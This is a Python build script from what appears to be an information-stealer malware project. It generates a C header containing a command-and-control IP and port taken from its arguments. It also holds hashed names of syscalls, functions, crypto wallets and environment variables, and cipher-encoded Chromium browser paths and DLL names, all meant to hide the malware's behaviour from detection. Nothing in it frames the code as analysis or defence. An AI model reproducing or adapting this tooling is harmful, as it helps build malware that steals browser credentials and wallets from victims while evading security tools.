import socket
import struct
from sys import argv
from RawData import *

MacrosFile = "./include/macros.h"
HashData = [syscalls, functions, wallets, EnvVariables]
EncodeData = [ChromiumBrowsersPaths, dlls, OtherStuff]

def EncodeString(string):
    TempKey = 5
    EncodedString = []

    for char in string:
        char = ord(char)
        if TempKey < 0:
            TempKey = TempKey * -1
        elif TempKey == 0:
            TempKey = 5

        EncodedString.append(hex(char + TempKey))
        TempKey = char - TempKey
    
    EncodedString.append("0x00")

    return EncodedString

def HashString(string):
    total = 0
    idx = 1
    temp = 0
    CurrentValue = 0

    for i in range(len(string)):
        char = ord(string[i])
        if i + 1 == len(string):
            if idx > 20:
                idx = idx % 10
            CurrentValue = (char << idx) ^ CurrentValue
        elif i + 2 == len(string):
            CurrentValue = (ord(string[i + 1]) * idx) << 1
        else:
            CurrentValue = char * (ord(string[i + 2]) + idx)

        total += char << 2
        total += CurrentValue
        total += idx * CurrentValue
        temp += CurrentValue
        idx += 1

    return hex(total ^ temp)

def inet_addr(ip):
    return struct.unpack("I", socket.inet_aton(ip))[0]

def GetHashedEncodedData():
    FinalData = ""
    for i in range(len(HashData)):
        for j in range(len(HashData[i])):
            HashedData = HashString(HashData[i][j])
            if i == 0 and j == 0:
                name = HashData[i][j].split(".")[0].upper()
            elif i == 2:
                name = WalletsNames[j].upper()
            else:
                name = HashData[i][j].upper()

            FinalData += (f"#define {name} {HashedData}\n")

    for i in range(len(EncodeData)):
        for j in range(len(EncodeData[i])):
            EncodedData = ", ".join(EncodeString(EncodeData[i][j]))
            if i == 0:
                if j >= 14:
                    name = EncodeData[i][j].split("\\")[2].replace(" ", "_")
                else:
                    name = EncodeData[i][j].split("\\")[1].replace(" ", "_")

                FinalData += (f"#define {name.upper()} {{{EncodedData}}}\n")
            elif i== 1:
                name = EncodeData[i][j].split(".")[0]
                FinalData += (f"#define {name.upper()} (unsigned short[{len(EncodeData[i][j]) + 1}]){{{EncodedData}}}\n")
            else:
                name = MacroName[j]
                FinalData += (f"#define {name} {{{EncodedData}}}\n")

    return FinalData

def main():
    file = open(MacrosFile, "w")
    data = "#ifndef MACROS_YS\n#define MACROS_YS\n\n\n"
    data += f"#define C2_IP {inet_addr(argv[1])}\n"
    data += f"#define C2_PORT {socket.htons(int(argv[2]))}\n\n\n"
    data += GetHashedEncodedData()
    data += "\n\n\n#endif"

    file.write(data)
    file.close()

if __name__ == "__main__":
    main()